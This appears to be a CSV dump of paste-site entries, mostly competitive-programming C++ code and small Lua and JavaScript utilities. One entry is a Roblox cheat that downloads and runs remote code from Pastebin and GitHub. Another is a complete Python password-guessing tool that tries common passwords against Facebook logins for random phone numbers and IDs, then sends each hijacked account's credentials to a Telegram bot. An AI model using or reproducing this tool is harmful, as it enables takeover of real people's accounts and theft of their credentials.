id,title,username,language,date,content
9RmXdDxg,Integer Cards,LEGEND2004,C++,Thursday 3rd of August 2023 06:43:33 AM CDT,"#include <bits/stdc++.h>
using namespace std;

#define int long long
#define pb push_back

signed main()
{
    int n , m , k , b , c;
    cin >> n >> m;
    set<int> s;
    map<int , int> cnt;
    for(int i = 0; i < n; i++){
        cin >> k;
        s.insert(k);
        cnt[k]++;
    }
    while(m--){
        cin >> b >> c;
        s.insert(c);
        cnt[c] += b;
    }
    auto it = s.end();
    it--;
    int p , l , ans = 0;
    while(it != s.begin()){
        l = *it;
        p = min(n , cnt[l]);
        ans += (p * l);
        n -= p;
        it--;
    }
    l = *it;
    p = min(n , cnt[l]);
    ans += (p * l);
    cout << ans << endl;
}
"
n2mGNj5r,Skibid Toilet Siege Defense,LuaXe,Lua,Thursday 3rd of August 2023 06:31:15 AM CDT,"function A() spawn(function () while getgenv().A do if workspace.Airdrops:FindFirstChild(""Airdrop"") then TPCFrame(workspace.Airdrops.Airdrop.Center.CFrame) fireproximityprompt(workspace.Airdrops.Airdrop.Center.ProximityPrompt) end task.wait() end end) end
function F() spawn(function () while getgenv().F do for i, v in pairs(game:GetService(""Workspace"").Enemies:GetChildren()) do if v:FindFirstChild(""Flush"") then TPCFrame(v.Flush.CFrame) if v.Flush:FindFirstChild(""FlushPromp"") then fireproximityprompt(v.Flush.FlushPromp) end end end wait() end end) end

local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wall%20v3')))()

local w = library:CreateWindow(""Skibid Toilet Siege"")

local b = w:CreateFolder(""Main"")

b:Toggle(""Kill All"",function(val) getgenv().F = val F() end)
b:Toggle(""Collect Crates"",function(val) getgenv().A = val A() end)

b:Label(""Made by X_LuaF#0705"",{TextSize = 21; TextColor = Color3.fromRGB(255,255,255); BgColor = Color3.fromRGB(38, 38, 38);})

local w = library:CreateWindow(""LocalPlayer"")

local b = w:CreateFolder(""LP"")

b:DestroyGui()

b:Button(""Discord"",function() setclipboard(""workink.co/2GQ/LTD"") end)
b:Button(""Full Version"",function() loadstring(game:HttpGet(""https://pastebin.com/raw/GphZf9Xe"", true))() end)
b:Button(""Rejoin"",function() loadstring(game:HttpGet(""https://pastebin.com/raw/mM7JBG5h"", true))() end)
b:Button(""Reset"",function() loadstring(game:HttpGet(""https://pastebin.com/raw/EEY6SATj"", true))() end)

b:Slider(""WalkSpeed"",{min = 0; max = 10000; precise = false;},function(val) game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = val end)
b:Slider(""JumpPower"",{min = 0; max = 10000; precise = false;},function(val) game.Players.LocalPlayer.Character.Humanoid.JumpPower = val end)
b:Slider(""HipHeight"",{min = 0; max = 10000; precise = false;},function(val) game.Players.LocalPlayer.Character.Humanoid.HipHeight = val end)
b:Slider(""Gravity"",{min = 0; max = 360; precise = false;},function(val) game.workspace.Gravity = val end)
b:Slider(""FOV"",{min = 0;max = 120;precise = false;},function(val) game.workspace.CurrentCamera.FieldOfView = val end)

function TPCFrame(Player_CFrame) if game.Players.LocalPlayer.Character:FindFirstChild(""HumanoidRootPart"") then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player_CFrame end end
function RTPCFrame(M_CF) if game.Players.LocalPlayer.Character:FindFirstChild(""HumanoidRootPart"") then M_CF.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame end end
function PHP(Player_HP) if game.Players.LocalPlayer.Character:FindFirstChild(""Humanoid"") then game.Players.LocalPlayer.Character.Humanoid.Health = Player_HP end end     "
UfyrpBhh,Greek to Greeklish Javascript Function by Nicolas Lagios,nicolaslagios,JavaScript,Thursday 3rd of August 2023 06:23:26 AM CDT,"//Greek to Greeklish Javascript Function by Nicolas Lagios - Rocket Path P.C.
function replaceGreekCharacters(txt) {
    const greekToLatinMap = {
      //μικρά ελληνικά
      ""α"": ""a"",""β"": ""b"",
      ""γ"": ""g"",""δ"": ""d"",
      ""ε"": ""e"",""ζ"": ""z"",
      ""η"": ""h"",""θ"": ""th"",
      ""ι"": ""i"",""κ"": ""k"",
      ""λ"": ""l"",""μ"": ""m"",
      ""ν"": ""n"",""ξ"": ""x"",
      ""ο"": ""o"",""π"": ""p"",
      ""ρ"": ""r"",""σ"": ""s"",
      ""τ"": ""t"",""υ"": ""y"",
      ""φ"": ""ph"",""χ"": ""ch"",
      ""ψ"": ""ps"",""ω"": ""w"",
      
      //μικρά με τόνους
      ""ά"": ""a"",""έ"": ""e"",
      ""ή"": ""h"",""ί"": ""i"",
      ""ό"": ""o"",""ύ"": ""y"",
      ""ώ"": ""w"",

      //κεφαλαία ελληνικά
      ""Α"": ""A"",""Β"": ""B"",
      ""Γ"": ""G"",""Δ"": ""D"",
      ""Ε"": ""E"",""Ζ"": ""Z"",
      ""Η"": ""H"",""Ρ"": ""TH"",
      ""Ι"": ""I"",""Κ"": ""K"",
      ""Λ"": ""L"",""Μ"": ""M"",
      ""Ν"": ""N"",""Ξ"": ""X"",
      ""Ο"": ""O"",""Π"": ""P"",
      ""Ρ"": ""R"",""Σ"": ""S"",
      ""Τ"": ""T"",""Υ"": ""Y"",
      ""Φ"": ""PH"",""Χ"": ""CH"",
      ""Ψ"": ""PS"",""Ω"": ""W"",
      
      //κεφαλαία με τόνους
      ""Ά"": ""A"",""Έ"": ""E"",
      ""Ή"": ""H"",""Ί"": ""I"",
      ""Ό"": ""O"",""Ύ"": ""Y"",
      ""Ώ"": ""W"",
    };
    for (const greekCharacter in greekToLatinMap) {
        txt = txt.replace(greekCharacter, greekToLatinMap[greekCharacter]);
    }
    return txt;
  }"
JtjXPU4k,data653,TestGuy1,JSON,Thursday 3rd of August 2023 06:13:13 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '6de0d72551e70b896cc73b805623d3ffbb0766a4853c7393c4d23d2e13a493b5b365285adc1021f1099016549f36de205dab422048950008a31121cf652e69008877edd81db323e77958397a5298a257de5ba68e78c350d874fd911f4c0cfb725246b2d2c0ef1524cdda4ef2170bb224cef8489ac89b2263219a7b14e8bcec60',
  otherdata: [
    '59be09b00b413f818ebc703c674ddd6a',
    '66c4bb42bf0ea084638343a9ae3c53ef',
    '2ab16ccf0f05658295a2b04b9df1bfff',
    'c6bf6603b6ee37b3ea36cb4a9df0c431',
    'a69a53d97bc60c814eed91bdde34abfd',
    '9fe40bfd0757825d73483b64c1deff8a',
    '4009d643bd9e7e323647e6d7af81cd6c',
    'a0369d6c785b5ea5c1ba4f8f68b539a8'
  ]
}"
yjjUQZCM,G,Salvens,C++,Thursday 3rd of August 2023 06:08:59 AM CDT,"#include <iostream>
#include <iomanip>
#include <vector>
#include <array>
#include <set>

using namespace std;

//#define int long long

const long long INF = 1e9 + 7;
const int MAXN = 5e4 + 100;
const int N = 1e5 + 10;
const int MOD = 1e9 + 7;

int n, k;
int dp[MAXN][510];
array<vector<int>, MAXN> g;
int ans = 0;

void dfs(int v, int p) {
    dp[v][0] = 1;
    for (auto to: g[v]) {
        if (to == p) {
            continue;
        }
        dfs(to, v);
        for (int len = 0; len < k; ++len) {
            ans += dp[to][len] * dp[v][k - len - 1];
        }
        for (int len = 0; len <= k; ++len) {
            dp[v][len + 1] += dp[to][len];
        }
    }
}

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);
    cin >> n >> k;
    for (int i = 0; i < n - 1; ++i) {
        int u, v;
        cin >> u >> v;
        --u, --v;
        g[u].emplace_back(v);
        g[v].emplace_back(u);
    }
    dfs(0, -1);
    cout << ans << '\n';
}"
cJQpAaXC,microcarrot,rungholt,Lua,Thursday 3rd of August 2023 05:40:22 AM CDT,"local function InOutChest()
    turtle.select(1)
    turtle.dropUp()
    turtle.select(2)
    turtle.dropUp()
	turtle.select(1)
    turtle.suckUp(1)
end

while true do
    local isBlock, data = turtle.inspect()
    if isBlock then
        if data.state and data.state.age == 7 then
            InOutChest()
            turtle.dig()
        end
    else
        turtle.select(1)
        turtle.place()
    end
    turtle.turnRight()
    sleep(30)
end"
E90sav9m,G,Salvens,C++,Thursday 3rd of August 2023 05:30:38 AM CDT,"#include <iostream>
#include <iomanip>
#include <vector>
#include <array>
#include <set>

using namespace std;

//#define int long long

const long long INF = 1e9 + 7;
const int MAXN = 105;
const int N = 1e5 + 10;
const int MOD = 1e9 + 7;

int dp[MAXN][MAXN][MAXN];

void init_dp() {
    for (int i = 0; i < MAXN; ++i) {
        for (int j = 0; j < MAXN; ++j) {
            for (int k = 0; k < MAXN; ++k) {
                dp[i][j][k] = INF;
            }
        }
    }
}

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);
    int n, m;
    cin >> n >> m;
    vector<int> a(n);
    for (int i = 0; i < n; ++i) {
        cin >> a[i];
    }
    init_dp();
    for (int i = 0; i < n; ++i) {
        for (int j = 1; j <= m; ++j) {
            dp[i][i][j] = (a[i] == j ? 0 : 1);
        }
    }
    for (int len = 2; len <= n; ++len) {
        for (int l = 0; l + len - 1 < n; ++l) {
            int r = l + len - 1;
            for (int col = 1; col <= m; ++col) {
                for (int mid = l; mid < r; ++mid) {
                    dp[l][r][col] = min(dp[l][r][col], dp[l][mid][col] + dp[mid + 1][r][col]);
                }
                if (a[l] == a[r]) {
                    if (len > 2) {
                        dp[l][r][col] = min(dp[l][r][col], dp[l + 1][r - 1][a[l]] + (a[l] == col ? 0 : 1));
                    } else {
                        dp[l][r][col] = min(dp[l][r][col], (a[l] == col ? 0 : 1));
                    }
                }
            }
        }
    }
    int ans = INF;
    for (int col = 1; col <= m; ++col) {
        ans = min(ans, dp[0][n - 1][col]);
    }
    cout << ans << '\n';
}"
CHATeXxZ,10198 - Counting,MiinaMagdy,C++,Thursday 3rd of August 2023 05:04:26 AM CDT,"#include <bits/stdc++.h>

using namespace std;

#define rep(i,n) for (int i = 0, _n = (n); i < _n; i++)
#define repr(i,n) for (int i = (n) - 1; i >= 0; i--)
#define int64 long long
#define pb push_back

 
struct BigInteger {
	static const int BASE = 1000000000; // 10^9
	
	vector<int64> digits;
	
	BigInteger() {
		digits.clear();
		digits.pb(0);
	}
	BigInteger(int64 number) {
		digits.clear();
		do {
			digits.pb(number % BASE);
			number /= BASE;
		} while (number);
	}
	
	BigInteger operator + (const BigInteger &b) const {
		BigInteger res = BigInteger();
		res.digits.resize(max(b.digits.size(), digits.size()));
		int64 remainder = 0;
		rep(i, res.digits.size()) {
			if (i < int(digits.size())) remainder += digits[i];
			if (i < int(b.digits.size())) remainder += b.digits[i];
			res.digits[i] = remainder % BASE;
			remainder /= BASE;
		}
		while (remainder) {
			res.digits.pb(remainder % BASE);
			remainder /= BASE;
		}
		return res;
	}
	
	BigInteger operator * (const BigInteger &b) const {
		BigInteger res = BigInteger();
		res.digits = vector<int64>(b.digits.size() + digits.size() - 1, 0);
		rep(i, digits.size()) rep(j, b.digits.size())
			res.digits[i + j] += digits[i] * (int64)b.digits[j];
		int64 remainder = 0;
		rep(i, res.digits.size()) {
			remainder += res.digits[i];
			res.digits[i] = remainder % BASE;
			remainder /= BASE;
		}
		while (remainder) {
			res.digits.pb(remainder % BASE);
			remainder /= BASE;
		}
		return res;
	}
	
	void print() {
		printf(""%lld"", digits.back());
		repr(i, (int)digits.size() - 1) printf(""%09lld"", digits[i]);
	}
	
	static BigInteger power(const BigInteger &b, int64 k) {
		if (k == 0) return BigInteger(1);
		if (k == 1) return b;
		BigInteger res = power(b, k / 2);
		res = res * res;
		if (k & 1) return res * b;
		return res;
	}
};

BigInteger dp[1001][1001];
bool cached[1001][1001];

BigInteger solve(const int &n, int idx, int sum) {
	if (sum <= 0) {
		return BigInteger(sum == 0);
	}
	BigInteger &ret = dp[idx][sum];
	if (cached[idx][sum])
		return ret;
	
	ret = 0;
	for (int i = 1; i <= 4; i++) {
		ret = ret + solve(n, idx + 1, sum - ((i - 1) % 3 + 1));
	}
	cached[idx][sum] = true;
	return ret;
}

int main() {
	int n;
	while (scanf(""%d"", &n) != EOF) {
		BigInteger ans = solve(n, 0, n);
		ans.print();
		puts("""");
	}
	return 0;
}
"
BJZPKtU1,hunt face for 10d,SFSF4P,Python,Thursday 3rd of August 2023 04:51:23 AM CDT,"


import os,sys,time,random,json,requests,mechanize,re
from mechanize import Browser
from user_agent import generate_user_agent
from requests import post

def pr(z):
    for e in z:
     sys.stdout.write(e) 
     sys.stdout.flush() 
     time.sleep(0.004)

passwords = [""11223344"",""10101010"",""12341234"",""123123123"",""aassddff"",""zzxxccvv"",""qqwweerr"",""1q2w3e4r"",""12121212@"",""19991999"",""20002000"",""1122334455""]

W = ""\033[0m""
G = '\033[32;1m'
R = '\033[31;1m'
Y = '\033[33;1m'
B = '\033[34;1m'
P = '\033[35;1m'
B2 = '\033[36;1m'


id_token = {'id':'', 'token':''}
pas = []


class FB:
	def __init__(sfsf):
		sfsf.session = requests.Session()
		sfsf.h1 = {
			'Host': 'mbasic.facebook.com',
			'cache-control': 'max-age=0',
			'sec-ch-ua-mobile': '?1',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': generate_user_agent(),
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'accept-language': 'en-US;q=0.9'
			}
		sfsf.res1 = sfsf.session.get('https://mbasic.facebook.com/login.php',headers=sfsf.h1)
		sfsf.h2 = {
			""Host"": ""mbasic.facebook.com"",
			""cache-control"": ""max-age=0"",
			""upgrade-insecure-requests"": ""1"",
			""origin"": ""https://mbasic.facebook.com"",
			""content-type"": ""application/x-www-form-urlencoded"",
			""user-agent"": generate_user_agent(),
			""accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"",
			""x-requested-with"": ""mark.via.gp"",
			""sec-fetch-site"": ""same-origin"",
			""sec-fetch-mode"": ""navigate"",
			""sec-fetch-user"": ""?1"",
			""sec-fetch-dest"": ""document"",
			""referer"": ""https://mbasic.facebook.com/login.php"",
			""accept-encoding"": ""gzip, deflate"",
			""accept-language"": ""en-US;q=0.9""
			}
		sfsf.logo = (f""""""\n\n\n{W}		-  {R} #    {W}Coder: sFsF {R}      # {W} -  
		-   {R}#  {W}TeLeGraM: YYYY02  {R}  # {W} -
		-   {R}#  {W} Version: 1.0      {R} # {W} -\n\n"""""")
		
		sfsf.start1 = (f""""""\n\n {W}[{R} 1{W} ]{W} random phone number .\n {W}[{R} 2{W} ]{W} random ID . \n\n{W}- - - - - - - - - - - - - -"""""")
		
	def generate_num(sfsf):
		return  ''.join(random.choices('0123456789', k=8))
	def generate_id(sfsf):
		return ""1000""+ ''.join(random.choices('0123456789', k=11))
		
	def token_id(sfsf):
		pr(W+'\n| Enter'+Y+' Token Bot |')
		sfsf.t = input(G+' \n  ==> ')
		pr(W+'\n| Enter '+Y+' ID TeleGram |')
		sfsf.i = input(G+' \n  ==> ')
		id_token['id'] = sfsf.i
		id_token['token'] = sfsf.t
		


	def num(sfsf):
		os.system('clear')
		pr(sfsf.logo)
		FB().token_id()
		pr(B2+'\n\n| Enter password to begin hunt FB account  |')
		PSW = input(G+' \n  ==> ')
		pas.append(PSW)
		num,bad,done,errors =0,0,0,0
		
		while True:
			gen = FB().generate_num()
			ID = '+96478'+ gen
			if pas[0] == '':
				p = ""078"" +gen
			else:
				p = pas[0]
			try:
				num +=1
				sfsf.data = {
			""lsd"": re.search('name=""lsd"" value=""(.*?)""', str(sfsf.res1.text)).group(1),
			""jazoest"": re.search('name=""jazoest"" value=""(.*?)""', str(sfsf.res1.text)).group(1),
			""m_ts"": re.search('name=""m_ts"" value=""(.*?)""', str(sfsf.res1.text)).group(1),
			""li"": re.search('name=""li"" value=""(.*?)""', str(sfsf.res1.text)).group(1),
			""try_number"": re.search('name=""try_number"" value=""(.*?)""', str(sfsf.res1.text)).group(1),
			""unrecognized_tries"": re.search('name=""unrecognized_tries"" value=""(.*?)""', str(sfsf.res1.text)).group(1),
			""email"": ID,
			""pass"": p,
			""bi_xrwh"": re.search('name=""bi_xrwh"" value=""(.*?)""', str(sfsf.res1.text)).group(1),
			""_fb_noscript"": re.search('name=""_fb_noscript"" value=""(.*?)""', str(sfsf.res1.text)).group(1)
			}
				send_req = sfsf.session.post(""https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=9"",data=sfsf.data,headers=sfsf.h2)
				if ""c_user"" in sfsf.session.cookies.get_dict():
					os.system('clear')
					done+=1
					print(sfsf.logo)
					print(R+f'''\n {B}|  The source is running .. |\n\n{P}- - - - - - - - - - - - - - - - - - - - - - -\n\n{W}- user : {ID}\n- password : {p}\n{G}- DONE  : {done}\n{R}- BAD  : {bad}\n{P}- Checked : {num} \n- Errors : {errors}\n\n\n - - - - - - - - - - - - - - - - - - - - - -''')
					requests.post(f""https://api.telegram.org/bot{id_token['token']}/sendMessage?chat_id={id_token['id']}&text=تم صيد حساب فيسبوك شـغـال ✅\n- - - - - - - - - - - - - - - - - - - - - - -‌\n✦  \n✦ 𝐄𝐦𝐚𝐢𝐥 : {ID}\n✦ 𝐏𝐚𝐬𝐬 : {p} #- - - - - - - - - - - - - - - - \n  | @YYYY02 | @T6TUT  "" )
				else:
					os.system('clear')
					bad+=1
					print(sfsf.logo)
					print(R+f'''\n {B}|  The source is running .. |\n\n{P}- - - - - - - - - - - - - - - - - - - - - - -\n\n{W}- user : {ID}\n- password : {p}\n{G}- DONE  : {done}\n{R}- BAD  : {bad}\n{P}- Checked : {num} \n- Errors : {errors}\n\n\n - - - - - - - - - - - - - - - - - - - - - -''')
			except:
				os.system('clear')
				errors+=1
				print(R+f'''\n {B}|  The source is running .. |\n\n{P}- - - - - - - - - - - - - - - - - - - - - - -\n\n{W}- user : {ID}\n- password : {p}\n{G}- DONE  : {done}\n{R}- BAD  : {bad}\n{P}- Checked : {num} \n- Errors : {errors}\n\n\n - - - - - - - - - - - - - - - - - - - - - -''')
				pass


	def id(sfsf):
		os.system('clear')
		pr(sfsf.logo)
		FB().token_id()
		pr(B2+'\n\n\n| Enter password to begin hunt FB account  |')
		PSW = input(G+' \n  ==> ')
		pas.append(PSW)
		if pas[0] == '':
			p = random.choice(passwords)
		else:
			p = pas[0]
		
		num,bad,done,errors =0,0,0,0
		while True:
			ID = FB().generate_id()
			try:
				num +=1
				sfsf.data = {
			""lsd"": re.search('name=""lsd"" value=""(.*?)""', str(sfsf.res1.text)).group(1),
			""jazoest"": re.search('name=""jazoest"" value=""(.*?)""', str(sfsf.res1.text)).group(1),
			""m_ts"": re.search('name=""m_ts"" value=""(.*?)""', str(sfsf.res1.text)).group(1),
			""li"": re.search('name=""li"" value=""(.*?)""', str(sfsf.res1.text)).group(1),
			""try_number"": re.search('name=""try_number"" value=""(.*?)""', str(sfsf.res1.text)).group(1),
			""unrecognized_tries"": re.search('name=""unrecognized_tries"" value=""(.*?)""', str(sfsf.res1.text)).group(1),
			""email"": ID,
			""pass"": p,
			""bi_xrwh"": re.search('name=""bi_xrwh"" value=""(.*?)""', str(sfsf.res1.text)).group(1),
			""_fb_noscript"": re.search('name=""_fb_noscript"" value=""(.*?)""', str(sfsf.res1.text)).group(1)
			}
				send_req = sfsf.session.post(""https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=9"",data=sfsf.data,headers=sfsf.h2)
				if ""c_user"" in sfsf.session.cookies.get_dict():
					os.system('clear')
					done+=1
					print(sfsf.logo)
					print(R+f'''\n {B}|  The source is running .. |\n\n{P}- - - - - - - - - - - - - - - - - - - - - - -\n\n\n{W}- user : {ID}\n- password : {p}\n{G}- DONE  : {done}\n{R}- BAD  : {bad}\n{P}- Checked : {num} \n- Errors : {errors}\n\n\n - - - - - - - - - - - - - - - - - - - - - -''')
					requests.post(f""https://api.telegram.org/bot{id_token['token']}/sendMessage?chat_id={id_token['id']}&text=تم صيد حساب فيسبوك شـغـال ✅\n- - - - - - - - - - - - - - - - - - - - - - -‌\n✦  \n✦•𝐄𝐦𝐚𝐢𝐥  : {ID}\n✦ 𝐏𝐚𝐬𝐬 : {p} - - - - - - - - - - - - - - - - \n  | @YYYY02 | @T6TUT  "" )
				else:
					os.system('clear')
					bad+=1
					print(sfsf.logo)
					print(R+f'''\n {B}|  The source is running .. |\n\n{P}- - - - - - - - - - - - - - - - - - - - - - -\n\n\n{W}- user : {ID}\n- password :{G} {p}\n{G}- DONE  : {done}\n{R}- BAD  : {bad}\n{P}- Checked : {num} \n- Errors : {errors}\n\n\n - - - - - - - - - - - - - - - - - - - - - -''')
			except:
				os.system('clear')
				print(R+f'''\n {B}|  The source is running .. |\n\n{P}- - - - - - - - - - - - - - - - - - - - - - -\n\n\n{W}- user : {ID}\n- password :{G} {p}\n{G}- DONE  : {done}\n{R}- BAD  : {bad}\n{P}- Checked : {num} \n- Errors : {errors}\n\n\n - - - - - - - - - - - - - - - - - - - - - -''')
				errors+=1
				pass
	
	def choice(sfsf):
		os.system('clear')
		pr(sfsf.logo)
		pr(sfsf.start1)
		ch = input(f""\n\n{R}- {W}choice : "")
		if ch == ""1"":
			FB().num()
		elif ch == ""2"":
			FB().id()
		else:
			FB().choice()


FB().choice()"
n3FRdT5j,G,Salvens,C++,Thursday 3rd of August 2023 04:39:15 AM CDT,"#include <iostream>
#include <iomanip>
#include <vector>
#include <array>
#include <set>

using namespace std;

#define int long long

const long long INF = 1e18 + 7;
const int MAXN = 1e5 + 100;
const int N = 1e5 + 10;
const int MOD = 1e9 + 7;

array<int, 4 * MAXN> tree, upd, simple;
array<int, MAXN> a;

void build(int x, int lx, int rx) {
    if (lx + 1 == rx) {
        tree[x] = a[lx] * (lx + 1);
        simple[x] = a[lx];
        return;
    }
    int mid = (rx + lx) / 2;
    build(2 * x + 1, lx, mid);
    build(2 * x + 2, mid, rx);
    tree[x] = tree[2 * x + 1] + tree[2 * x + 2];
    simple[x] = simple[2 * x + 1] + simple[2 * x + 2];
}

void push(int x, int lx, int rx) {
    if (lx + 1 != rx) {
        upd[2 * x + 1] += upd[x];
        upd[2 * x + 2] += upd[x];
    }
    int a1 = lx + 1, an = rx, n = rx - lx;
    tree[x] += upd[x] * (((a1 + an) * n) / 2);
    simple[x] += (rx - lx) * upd[x];
    upd[x] = 0;
}

void update(int x, int lx, int rx, int l, int r, int d) {
    push(x, lx, rx);
    if (lx >= r || rx <= l) {
        return;
    }
    if (lx >= l && rx <= r) {
        upd[x] += d;
        push(x, lx, rx);
        return;
    }
    int mid = (rx + lx) / 2;
    update(2 * x + 1, lx, mid, l, r, d);
    update(2 * x + 2, mid, rx, l, r, d);
    tree[x] = tree[2 * x + 1] + tree[2 * x + 2];
    simple[x] = simple[2 * x + 1] + simple[2 * x + 2];
}

int sum(int x, int lx, int rx, int l, int r) {
    push(x, lx, rx);
    if (lx >= r || rx <= l) {
        return 0;
    }
    if (lx >= l && rx <= r) {
        return tree[x] - simple[x] * l;
    }
    int mid = (rx + lx) / 2;
    return sum(2 * x + 1, lx, mid, l, r) + sum(2 * x + 2, mid, rx, l, r);
}

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);
    int n, m;
    cin >> n >> m;
    for (int i = 0; i < n; ++i) {
        cin >> a[i];
    }
    build(0, 0, n);
    for (int i = 0; i < m; ++i) {
        int type, l, r;
        cin >> type >> l >> r;
        --l;
        if (type == 1) {
            int d;
            cin >> d;
            update(0, 0, n, l, r, d);
        } else {
            cout << sum(0, 0, n, l, r) << '\n';
        }
    }
}"
